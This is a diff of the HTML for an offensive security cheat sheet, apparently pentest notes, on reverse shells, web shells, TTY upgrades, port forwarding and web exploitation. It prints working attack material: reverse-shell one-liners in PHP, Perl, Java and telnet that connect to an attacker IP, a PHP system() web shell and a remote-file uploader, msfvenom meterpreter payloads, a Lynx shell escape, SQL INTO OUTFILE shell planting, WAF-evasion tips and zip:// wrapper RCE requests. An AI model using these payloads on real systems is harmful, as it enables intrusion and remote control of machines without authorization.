+<p>Once we have figured out some vulnerability or misconfiguration in a running service. Which allows us to make a connection back to our attack machine we would like to set up a reverse shell. This can be done through version methods eg by using netcat, php, weevely, ruby, perl, python, java, jsp, bash tcp, Xterm, Lynx, Mysql. The section below has been mostly adapted from <a class="reference external" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">PentestMonkey Reverse shell cheat sheet</a>  and <a class="reference external" href="https://highon.coffee/blog/reverse-shell-cheat-sheet/">Reverse Shell Cheat sheet from HighOn.Coffee</a> and more.</p>
 <div class="section" id="netcat-nc">
 <h4>netcat (nc)<a class="headerlink" href="#netcat-nc" title="Permalink to this headline">¶</a></h4>
 <ul class="simple">
@@ -830,12 +854,17 @@ C=/page/uri     to define a different page to gather initial cookies from
 </pre></div>
 </div>
 </div></blockquote>
+<div class="admonition tip">
+<p class="first admonition-title">Tip</p>
+<p class="last">f in this case is a file name, if you want to have more then one reverse shell with this method you will have to use another letter (a … z) then the one you used intially.</p>
+</div>
 </div>
 <div class="section" id="php">
 <h4>PHP<a class="headerlink" href="#php" title="Permalink to this headline">¶</a></h4>
 <ul class="simple">
-<li><strong>PHP Shell</strong></li>
+<li><strong>PHP Web Shell</strong></li>
 </ul>
+<p>This is a kind of Web shell and not a reverse shell.</p>
 <blockquote>
 <div><p>We can create a new file say (shell.php) on the server containing</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;
@@ -857,11 +886,15 @@ C=/page/uri     to define a different page to gather initial cookies from
 <div class="highlight-None"><div class="highlight"><pre><span></span>curl -G -s http://10.X.X.X/somepage.php?data= --data-urlencode &quot;html=&lt;?php passthru(&#39;ls -lah&#39;); ?&gt;&quot; -b &quot;somecookie=somevalue&quot; | sed &#39;/&lt;html&gt;/,/&lt;\/html&gt;/d&#39;
 
 -G When used, this option will make all data specified with -d, --data, --data-binary or --data-urlencode to be used in an HTTP GET request instead of the POST request that otherwise would be used. The data will be appended to the URL with a  &#39;?&#39; separator.
--data-urlencode &lt;data&gt; (HTTP) This posts data, similar to the other -d, --data options with the exception that this performs URL-encoding.
--b, --cookie &lt;data&gt; (HTTP) Pass the data to the HTTP server in the Cookie header. It is supposedly the data previously received from the server in a &quot;Set-Cookie:&quot; line.  The data should be in the format &quot;NAME1=VALUE1; NAME2=VALUE2&quot;.
+-data-urlencode &lt;data&gt; (HTTP) Posts data, similar to the other -d, --data options with the exception that this performs URL-encoding.
+-b, --cookie &lt;data&gt; (HTTP) Passes the data to the HTTP server in the Cookie header. It is supposedly the data previously received from the server in a &quot;Set-Cookie:&quot; line.  The data should be in the format &quot;NAME1=VALUE1; NAME2=VALUE2&quot;.
 </pre></div>
 </div>
-<p>If you also want to provide upload functionality (Imagine, if we need to upload nc64.exe on Windows or other-binaries on linux), we can put the below code in the php file</p>
+<div class="admonition-todo admonition" id="index-4">
+<p class="first admonition-title">Todo</p>
+<p class="last">explain the sed command at the end of the command given above</p>
+</div>
+<p>If you also want to provide upload functionality (imagine, if we need to upload nc64.exe on Windows or other-binaries on linux), we can put the below code in the php file</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>&lt;?php
  if (isset($_REQUEST[&#39;fupload&#39;])) {
   file_put_contents($_REQUEST[&#39;fupload&#39;], file_get_contents(&quot;http://yourIP/&quot; . $_REQUEST[&#39;fupload&#39;]));
@@ -877,10 +910,12 @@ C=/page/uri     to define a different page to gather initial cookies from
 <li><strong>PHP Meterpreter</strong></li>
 </ul>
 <blockquote>
-<div>We can create a php meterpreter shell, run a exploit handler on msf, upload the payload on the server and wait for the connection.</div></blockquote>
-<p><strong>todo explain how to set up a multi handler</strong></p>
-<blockquote>
-<div><div class="highlight-None"><div class="highlight"><pre><span></span>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f raw -o /tmp/payload.php
+<div><p>We can create a php meterpreter shell, run a exploit handler on msf, upload the payload on the server and wait for the connection.</p>
+<div class="admonition-todo admonition" id="index-5">
+<p class="first admonition-title">Todo</p>
+<p class="last">explain how to set up a multi handler</p>
+</div>
+<div class="highlight-None"><div class="highlight"><pre><span></span>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f raw -o /tmp/payload.php
 </pre></div>
 </div>
 </div></blockquote>
@@ -888,11 +923,11 @@ C=/page/uri     to define a different page to gather initial cookies from
 <li><strong>PHP Reverse Shell</strong></li>
 </ul>
 <blockquote>
-<div><p>The code below assumes that the TCP connection uses file descriptor 3. This worked on my test system. If it doesn’t work, try 4, 5, 6</p>
+<div><p>The code below assumes that the TCP connection uses file descriptor 3. This worked on my test system. If it doesn’t work, try 4 or 5 or 6.</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>php -r &#39;$sock=fsockopen(&quot;192.168.56.101&quot;,1337);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;
 </pre></div>
 </div>
-<p>The above can be connected to by listening on port 1337 by using nc</p>
+<p>The above can be connected to by listening on port 1337 by using nc.</p>
 </div></blockquote>
 </div>
 <div class="section" id="weevely">
@@ -901,11 +936,13 @@ C=/page/uri     to define a different page to gather initial cookies from
 <div class="highlight-None"><div class="highlight"><pre><span></span>weevely generate password /tmp/payload.php
 </pre></div>
 </div>
-<p>which can be called by</p>
+<p>which can then be called by</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>weevely http://192.168.1.2/location_of_payload password
 </pre></div>
 </div>
-<p>However, it wasn’t as useful as php meterpreter or a reverse shell.</p>
+<p>However, it was not as useful as php meterpreter or a reverse shell.
+.. Todo:: elobrate -&gt; why wasn’t it usefull?
+.. Todo:: iirc (really not sure) if you don’t provide a password it will ask for it</p>
 </div>
 <div class="section" id="ruby">
 <h4>Ruby<a class="headerlink" href="#ruby" title="Permalink to this headline">¶</a></h4>
@@ -915,7 +952,7 @@ C=/page/uri     to define a different page to gather initial cookies from
 </div>
 <div class="section" id="perl">
 <h4>Perl<a class="headerlink" href="#perl" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-bash"><div class="highlight"><pre><span></span>perl -e <span class="s1">&#39;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;</span>
+<div class="highlight-perl"><div class="highlight"><pre><span></span><span class="n">perl</span> <span class="o">-</span><span class="n">e</span> <span class="s">&#39;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;</span>
 </pre></div>
 </div>
 </div>
@@ -932,21 +969,21 @@ C=/page/uri     to define a different page to gather initial cookies from
 </div>
 <div class="section" id="java">
 <h4>Java<a class="headerlink" href="#java" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">r</span> <span class="o">=</span> Runtime.getRuntime<span class="o">()</span>
-<span class="nv">p</span> <span class="o">=</span> r.exec<span class="o">([</span><span class="s2">&quot;/bin/bash&quot;</span>,<span class="s2">&quot;-c&quot;</span>,<span class="s2">&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span><span class="o">]</span> as String<span class="o">[])</span>
-p.waitFor<span class="o">()</span>
+<div class="highlight-java"><div class="highlight"><pre><span></span><span class="n">r</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">()</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="na">exec</span><span class="o">([</span><span class="s">&quot;/bin/bash&quot;</span><span class="o">,</span><span class="s">&quot;-c&quot;</span><span class="o">,</span><span class="s">&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span><span class="o">]</span> <span class="n">as</span> <span class="n">String</span><span class="o">[])</span>
+<span class="n">p</span><span class="o">.</span><span class="na">waitFor</span><span class="o">()</span>
 </pre></div>
 </div>
 </div>
 <div class="section" id="jsp">
 <h4>JSP<a class="headerlink" href="#jsp" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-bash"><div class="highlight"><pre><span></span>msfvenom -p java/jsp_shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span><span class="m">192</span>.168.110.129 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f war &gt; runme.war
+<div class="highlight-jsp"><div class="highlight"><pre><span></span>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.110.129 LPORT=4444 -f war &gt; runme.war
 </pre></div>
 </div>
 </div>
 <div class="section" id="bash-dev-tcp">
 <h4>Bash /dev/tcp<a class="headerlink" href="#bash-dev-tcp" title="Permalink to this headline">¶</a></h4>
-<p>If a server is listening on a port:</p>
+<p>If a server (attacker machine) is listening on a port:</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>nc -lvp port
 </pre></div>
 </div>
@@ -1006,6 +1043,8 @@ Connection: close
 <div class="highlight-None"><div class="highlight"><pre><span></span>rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet ATTACKING-IP 80 0/tmp/p
 
 telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
+
+.. Todo:: explain the example above
 </pre></div>
 </div>
 </div>
@@ -1028,7 +1067,7 @@ telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
 <h4>Lynx<a class="headerlink" href="#lynx" title="Permalink to this headline">¶</a></h4>
 <p>Obtain an interactive shell through lynx: It is possible to obtain an interactive shell via special LYNXDOWNLOAD URLs.
 This is a big security hole for sites that use lynx “guest accounts” and other public services. More details <a class="reference external" href="http://insecure.org/sploits/lynx.download.html">LynxShell</a></p>
-<p>When you start up a lynx client session, you can hit “g” (for Goto) and then enter the following URL:</p>
+<p>When you start up a lynx client session, you can hit “g” (for goto) and then enter the following URL:</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>URL to open: LYNXDOWNLOAD://Method=-1/File=/dev/null;/bin/sh;/SugFile=/dev/null
 </pre></div>
 </div>
@@ -1040,6 +1079,7 @@ This is a big security hole for sites that use lynx “guest accounts” and oth
 </ul>
 <blockquote>
 <div><div class="highlight-None"><div class="highlight"><pre><span></span>echo -n &quot;&lt;?php phpinfo(); ?&gt;&quot; | xxd -ps 3c3f70687020706870696e666f28293b203f3e
+
 select 0x3c3f70687020706870696e666f28293b203f3e into outfile &quot;/var/www/html/blogblog/wp-content/uploads/phpinfo.php&quot;
 </pre></div>
 </div>
@@ -1061,6 +1101,7 @@ select 0x3c3f70687020706870696e666f28293b203f3e into outfile &quot;/var/www/html
 <h4>Reverse Shell from Windows<a class="headerlink" href="#reverse-shell-from-windows" title="Permalink to this headline">¶</a></h4>
 <p>If there’s a way, we can execute code from windows, we may try</p>
 <ul class="simple">
+<li>Uploading ncat and executing it</li>
 <li>Powershell Empire/ Metasploit Web-Delivery Method</li>
 <li>Invoke-Shellcode (from powersploit)</li>
 </ul>
@@ -1072,6 +1113,10 @@ select 0x3c3f70687020706870696e666f28293b203f3e into outfile &quot;/var/www/html
 <ul class="simple">
 <li>Upload ncat and execute</li>
 </ul>
+<div class="admonition-todo admonition" id="index-6">
+<p class="first admonition-title">Todo</p>
+<p class="last">add Nishang?</p>
+</div>
 </div>
 <div class="section" id="msf-meterpreter-elf">
 <h4>MSF Meterpreter ELF<a class="headerlink" href="#msf-meterpreter-elf" title="Permalink to this headline">¶</a></h4>
@@ -1109,7 +1154,7 @@ mkfifo /tmp/cdniov; (nc -l -p 4444 ||nc -l 4444)0&lt;/tmp/cdniov | /bin/sh &gt;/
 </div>
 <div class="section" id="spawning-a-tty-shell">
 <span id="id7"></span><h3>Spawning a TTY Shell<a class="headerlink" href="#spawning-a-tty-shell" title="Permalink to this headline">¶</a></h3>
-<p>Once we have reverse shell, we need a full TTY session by using either Python, sh, perl, ruby, lua, IRB. <a class="reference external" href="https://netsec.ws/?p=337">Spawning a TTY Shell</a> and <a class="reference external" href="http://pentestmonkey.net/blog/post-exploitation-without-a-tty">Post-Exploitation Without A TTY</a> has provided multiple ways to get a tty shell</p>
+<p>Once we have reverse shell, we need a full TTY session by using either Python, sh, perl, ruby, lua, IRB. <a class="reference external" href="https://netsec.ws/?p=337">Spawning a TTY Shell</a> and <a class="reference external" href="http://pentestmonkey.net/blog/post-exploitation-without-a-tty">Post-Exploitation Without A TTY</a> have provided multiple ways to get a tty shell</p>
 <div class="section" id="id9">
 <h4>Python<a class="headerlink" href="#id9" title="Permalink to this headline">¶</a></h4>
 <div class="highlight-bash"><div class="highlight"><pre><span></span>python -c <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</span>
@@ -1208,8 +1253,7 @@ interact
 <div class="highlight-None"><div class="highlight"><pre><span></span>standard in must be a tty
 </pre></div>
 </div>
-<p>The su command would work from a terminal, however, would not take in raw stuff via the shell’s Standard Input.
-We can use a shell terminal trick that relies on Python to turn our non-terminal shell into a terminal shell</p>
+<p>The su command would work from a terminal, however, would not take in raw stuff via the shell’s Standard Input. We can use a shell terminal trick that relies on Python to turn our non-terminal shell into a terminal shell</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>(sleep 1; echo password) | python -c &quot;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;whoami&#39;]);&quot;
 root
 </pre></div>
@@ -1219,7 +1263,7 @@ root
 </div>
 <div class="section" id="spawning-a-fully-interactive-ttys-shell">
 <h3>Spawning a Fully Interactive TTYs Shell<a class="headerlink" href="#spawning-a-fully-interactive-ttys-shell" title="Permalink to this headline">¶</a></h3>
-<p><a class="reference external" href="https://twitter.com/ropnop">Ronnie Flathers</a> has already written a great blog on <a class="reference external" href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">Upgrading simple shells to fully interactive TTYs</a> Hence, almost everything is taken from that blog and kept here for completion purposes.</p>
+<p><a class="reference external" href="https://twitter.com/ropnop">Ronnie Flathers</a> has already written a great blog on <a class="reference external" href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">Upgrading simple shells to fully interactive TTYs</a> Hence, almost everything is taken from that blog post and kept here for completion.</p>
 <p>Many times, we will not get a fully interactive shell therefore it will/ have:</p>
 <ul class="simple">
 <li>Difficult to use the text editors like vim</li>
@@ -2678,6 +2722,38 @@ PasswordAuthentication yes
 </pre></div>
 </div>
 <p>The key here is -L which says we’re doing local port forwarding. Then it says we’re forwarding our local port 9000 to youtube.com:80, which is the default port for HTTP. Now open your browser and go to http://localhost:9000</p>
+<p><strong>Syntax</strong></p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>-L [bind_address:]port:host:hostport
+-L [bind_address:]port:remote_socket
+-L local_socket:host:hostport
+-L local_socket:remote_socket
+        Specifies that connections to the given TCP port or Unix socket on the local (client) host are to be forwarded to the given host and port, or Unix socket, on the remote side.  This works by allocating a socket to listen to either a TCP port on
+        the local side, optionally bound to the specified bind_address, or to a Unix socket.  Whenever a connection is made to the local port or socket, the connection is forwarded over the secure channel, and a connection is made to either host port
+        hostport, or the Unix socket remote_socket, from the remote machine.
+
+        Port forwardings can also be specified in the configuration file.  Only the superuser can forward privileged ports.  IPv6 addresses can be specified by enclosing the address in square brackets.
+
+        By default, the local port is bound in accordance with the GatewayPorts setting.  However, an explicit bind_address may be used to bind the connection to a specific address.  The bind_address of “localhost” indicates that the listening port be
+        bound for local use only, while an empty address or ‘*’ indicates that the port should be available from all interfaces.
+</pre></div>
+</div>
+<p>To share a interesting case, Let’s say there’s a host which is running port 22 on all interfaces and port 8080 and 8081 (or any other port) on local loopback interface (127.0.0.1), something like</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>tcp4       0      0 *.ssh                  *.*                    LISTEN
+tcp6       0      0 *.ssh                  *.*                    LISTEN
+tcp4       0      0 localhost.8080         *.*                    LISTEN
+tcp4       0      0 localhost.8081         *.*                    LISTEN
+</pre></div>
+</div>
+<p>Now, webserver on port 8080 and 8081 are running on localhost, if we have ssh access to the machine, we can tunnel them via local port forwarding and run it on the ethernet interface.</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>ssh -L IP_Address_of_Machine:&lt;Port-which-we-want-to-open-Let&#39;s say-9000&gt;:127.0.0.1:&lt;localhost-port-which-we-want-to-map-let&#39;s-say-8080&gt; user@IP_Address_of_Machine
+</pre></div>
+</div>
+<p>It would become</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>ssh -L 10.10.10.10:9000:127.0.0.1:8080 user@10.10.10.10 and
+ssh -L 10.10.10.10:9001:127.0.0.1:8081 user@10.10.10.10
+</pre></div>
+</div>
+<p>The above would open port 9000 and 9001 (on the external interface) and map it to port 8080 and 8081(which were running on local/ loopback interface).</p>
 </div>
 <div class="section" id="remote-port-forwarding">
 <h4>Remote Port Forwarding<a class="headerlink" href="#remote-port-forwarding" title="Permalink to this headline">¶</a></h4>
@@ -2715,13 +2791,6 @@ PasswordAuthentication yes
 <div class="highlight-None"><div class="highlight"><pre><span></span>proxychains4 remmina/ rdesktop
 </pre></div>
 </div>
-<p>If we have to share a interesting story with you, Recently, We were assigned a engagment to compromise a industrial plant. Let us walkthru what’s the scenario.</p>
-<p>Scenario:</p>
-<ul class="simple">
-<li>Attacker IP Network : 172.40.60.0/22; Attacker Current IP: 172.40.60.55 and Targetted IP: 172.16.96.2 (Possible SCADA Network - Natted IP)</li>
-<li>As it’s a industrial plant, there’s a firewall between IT Network (172.40.60.0/22) and SCADA Network (Possible IP 172.16.96.2 – This is NATTed IP)</li>
-<li></li>
-</ul>
 </div>
 </div>
 <div class="section" id="http">
@@ -2834,7 +2903,7 @@ This makes all connections considered &quot;insecure&quot; fail unless -k, --ins
 </div>
 <div class="section" id="http-404-custom-page">
 <h4>HTTP 404 Custom Page<a class="headerlink" href="#http-404-custom-page" title="Permalink to this headline">¶</a></h4>
-<p>Sometimes, it’s a good idea to look at 404 custom page also. There might be some information stored</p>
+<p>Sometimes, it’s a good idea to look at 404 custom page also. There might be some information stored.</p>
 </div>
 <div class="section" id="id20">
 <h4>PHP<a class="headerlink" href="#id20" title="Permalink to this headline">¶</a></h4>
@@ -3293,7 +3362,7 @@ iso.3.6.1.2.1.4.34.1.3.2.48.2.18.52.86.120.171.205.0.0.0.0.0.0.0.1 = INTEGER: 33
 </div>
 <p>Now, convert the decimal value after “iso.3.6.1.2.1.4.34.1.3.2” to hex which would be your IPv6 address “3002:1234:5678:ABCD::1”</p>
 </div></blockquote>
-<div class="admonition-todo admonition" id="index-0">
+<div class="admonition-todo admonition" id="index-7">
 <p class="first admonition-title">Todo</p>
 <p class="last">Mention examples for IPv6 connect</p>
 </div>
@@ -3574,11 +3643,11 @@ print &quot;* * * * * root /bin/bash /home/username/evilscript&quot;
 <li><p class="first">If there’s a XXE on a website and possible RFI using internal address i.e on <a class="reference external" href="http://127.0.0.1:80/home=RFI">http://127.0.0.1:80/home=RFI</a> rather than <a class="reference external" href="http://10.54.98.10:80/home=RFI">http://10.54.98.10:80/home=RFI</a>, utilize XXE to send the request with localaddress.</p>
 </li>
 <li><p class="first">If there’s a possible command execution on a website such as</p>
-<div class="highlight-None"><div class="highlight"><pre><span></span>curl -A &quot;bitvijays&quot; -i &quot;http://IPAddress/example?parameter=&#39; whoami&#39;&quot;
+<div class="highlight-None"><div class="highlight"><pre><span></span>curl -A &quot;bitvijays&quot; -i &quot;http://IPAddress/example?parameter=&#39;linux_command&#39;&quot;
 </pre></div>
 </div>
 <p>However, it is protected by a WAF, probably, try bash globbling techniques with ? and *. Refer <a class="reference external" href="https://medium.com/secjuice/waf-evasion-techniques-718026d693d8">Web Application Firewall (WAF) Evasion Techniques</a> and <a class="reference external" href="https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0">Web Application Firewall (WAF) Evasion Techniques #2</a> ! Amazing stuff here!
-Also, it might be a good idea to test the command with ? on your local machine first then directly on the target.</p>
+Also, it might be a good idea to test the command with ? on your local machine first then directly on the target. Also, sometimes, it adding a space before or after the linux_command might work like ‘ linux_command’ or ‘linux_command ‘</p>
 </li>
 <li><p class="first">Similar to ls there is dir in linux. Try “dir -l” Might be helpful sometimes.</p>
 </li>
@@ -3812,7 +3881,7 @@ Warning: include(): Failed opening &#39;expect://ls&#39; for inclusion (include_
 </pre></div>
 </div>
 <p>Burp Request</p>
-<div class="highlight-None"><div class="highlight"><pre><span></span>GET /?op=zip://uploads/def506bd2176265e006f2db3d7b4e9db11c459c1%23shell HTTP/1.1
+<div class="highlight-None"><div class="highlight"><pre><span></span>GET /?parameter=zip://uploads/def506bd2176265e006f2db3d7b4e9db11c459c1%23shell HTTP/1.1
 Host: 10.50.66.93
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
 
@@ -3820,11 +3889,9 @@ User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
 </pre></div>
 </div>
 <p>and we get RCE</p>
-<div class="highlight-None"><div class="highlight"><pre><span></span>home.php
-index.php
+<div class="highlight-None"><div class="highlight"><pre><span></span>index.php
 upload.php
 uploads
-view.php
 </pre></div>
 </div>
 <p>We may read more about it at <a class="reference external" href="https://www.securusglobal.com/community/2016/08/19/abusing-php-wrappers/">Bypassing PHP Null Byte Injection protections – Part II – CTF Write-up</a> or <a class="reference external" href="https://github.com/ctfs/write-ups-2015/tree/master/codegate-ctf-2015/web/owlur">CodeGate General CTF 2015: Owlur</a> – Read other write-ups in this.</p>
@@ -4099,8 +4166,9 @@ else if (! exif_imagetype($_FILES[&#39;uploadedfile&#39;][&#39;tmp_name&#39;])) 
 <p>Let’s also see, serverside code</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>if(isset($_POST[&#39;submit&#39;]) &amp;&amp; isset($_POST[&#39;sinfo&#39;])) {
                $tip = $_POST[&#39;sinfo&#39;];
-               $secretname = genFilename();  ## Generates a random file name
-               file_put_contents(&quot;uploads/&quot;. $client_ip . &#39;/&#39; . $secretname,  $sinfo);
+               $secretname = Random_Filename();  ## Generates a random file name
+           $location = Random_Number();      ## Generate a random number
+               file_put_contents(&quot;uploads/&quot;. $location . &#39;/&#39; . $secretname,  $sinfo);
 </pre></div>
 </div>
 <p>If we see, the contents of sinfo are directly put in a file.</p>
